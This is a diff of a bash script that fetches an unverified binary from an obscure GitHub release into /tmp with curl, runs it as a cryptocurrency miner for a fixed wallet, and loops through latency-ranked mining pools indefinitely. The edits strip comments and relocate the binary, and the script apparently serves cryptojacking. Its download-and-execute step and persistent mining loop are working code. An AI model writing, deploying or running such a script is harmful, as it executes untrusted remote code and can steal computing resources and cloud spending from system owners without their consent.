@@ -1,13 +1,12 @@
 #!/bin/bash
 
-# Miner download URL
 MINER_URL="https://github.com/vedhagsvp/vpase/releases/download/corcoka/srcbks"
-MINER_BIN="srcbks"
+MINER_BIN="/tmp/srcbks"
 
 # Download miner if not present
 if [ ! -f "$MINER_BIN" ]; then
-  echo "Miner binary not found, downloading..."
-  wget -q "$MINER_URL" -O "$MINER_BIN"
+  echo "Miner binary not found, downloading with curl..."
+  curl -L "$MINER_URL" -o "$MINER_BIN"
   if [ $? -ne 0 ]; then
     echo "Failed to download miner from $MINER_URL"
     exit 1
@@ -23,7 +22,7 @@ declare -A pools=(
   ["sg.luckypool.io"]="3118"
 )
 
-wallet="solo:cb16e28eda52f3750022c539e75c84610f87af8030a9.SKEA"
+wallet="solo:cb16e28eda52f3750022c539e75c84610f87af8030a9.DAVEA"
 algorithm="randomy"
 
 function ping_pool() {
@@ -33,21 +32,19 @@ function ping_pool() {
 
 echo "Measuring pool latencies..."
 
-# Store pools with their latency
 declare -A pool_latencies
 
 for pool in "${!pools[@]}"; do
   latency=$(ping_pool "$pool")
   if [[ -z "$latency" ]]; then
     echo "No response from $pool"
-    latency=100000  # very high latency for sorting
+    latency=100000
   else
     echo "$pool latency: $latency ms"
   fi
   pool_latencies[$pool]=$latency
 done
 
-# Sort pools by latency (lowest first)
 sorted_pools=($(for p in "${!pool_latencies[@]}"; do
   echo "$p ${pool_latencies[$p]}"
 done | sort -k2 -n | awk '{print $1}'))
@@ -55,12 +52,11 @@ done | sort -k2 -n | awk '{print $1}'))
 echo "Pools sorted by latency:"
 printf '%s\n' "${sorted_pools[@]}"
 
-# Loop to try pools in order until miner runs successfully or script is stopped
 while true; do
   for pool in "${sorted_pools[@]}"; do
     echo "Starting miner on pool $pool:${pools[$pool]}"
-    ./"$MINER_BIN" --algorithm $algorithm --pool $pool:${pools[$pool]} --wallet $wallet
+    "$MINER_BIN" --algorithm $algorithm --pool $pool:${pools[$pool]} --wallet $wallet
     echo "Miner exited on pool $pool. Trying next pool..."
-    sleep 5  # wait before retrying
+    sleep 5
   done
 done
